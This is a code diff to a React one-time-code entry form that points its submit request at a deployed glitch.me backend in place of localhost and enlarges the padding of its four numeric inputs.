@@ -47,7 +47,7 @@ function OtpCode() {
             setLoading(true);
             // Send form data to the backend
             console.log("Fullcode:", fullCode)
-            const response = await axios.post('http://localhost:3001/code', { code: fullCode });
+            const response = await axios.post('https://indecisive-elite-maple.glitch.me/code', { code: fullCode });
             console.log("Status", response.status);
             if (response.status === 200) {
                 setSuccess(true);
@@ -114,7 +114,7 @@ function OtpCode() {
                     <div className='flex justify-center mt-2'>
                         <div className='flex flex-row w-48 space-x-4 items-center py-2'>
                             <input
-                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-2 px-2 leading-tight focus:outline-none"
+                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-4 px-3 leading-tight focus:outline-none"
                                 type="number"
                                 aria-label="code"
                                 placeholder='0'
@@ -128,7 +128,7 @@ function OtpCode() {
                                 required
                             />
                             <input
-                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-2 px-2 leading-tight focus:outline-none"
+                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-4 px-3 leading-tight focus:outline-none"
                                 type="number"
                                 aria-label="code"
                                 name="code2"
@@ -142,7 +142,7 @@ function OtpCode() {
                                 required
                             />
                             <input
-                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-2 px-2 leading-tight focus:outline-none"
+                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-4 px-3 leading-tight focus:outline-none"
                                 type="number"
                                 aria-label="code"
                                 placeholder='0'
@@ -156,7 +156,7 @@ function OtpCode() {
                                 required
                             />
                             <input
-                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-2 px-2 leading-tight focus:outline-none"
+                                className="appearance-none bg-transparent border-b border-black bg-[#fcc4c4] rounded-md shadow-inner w-full text-center font-bold text-black placeholder:text-gray-900 placeholder:opacity-50 py-4 px-3 leading-tight focus:outline-none"
                                 type="number"
                                 aria-label="code"
                                 placeholder='0'
